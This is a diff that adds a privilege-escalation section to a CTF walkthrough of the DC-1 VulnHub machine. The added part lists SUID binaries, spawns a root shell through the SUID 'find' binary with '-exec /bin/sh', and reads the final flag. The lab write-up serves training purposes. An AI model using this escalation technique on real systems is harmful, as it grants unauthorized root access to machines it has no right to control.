@@ -91,9 +91,53 @@ i used `multi/http/drupal_drupageddon` :
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/7de0d071-2ffe-496b-bf0b-336f6516ec22)
 
+## 3.Privilege Escalation
 
+Search for any SUID binaries on the system  :
 
+```bash
+root@kali: find / -user root -perm /4000 2>/dev/null
 
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+```
+
+there is `find` binary here, so it can be easily exploited :
+
+```bash
+www-data@DC-1: find . -exec /bin/sh \; -quit
+
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+
+cd /root
+
+cat thefinalflag.txt
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+```
+
+this is how you can get root on the system.
 
 
 
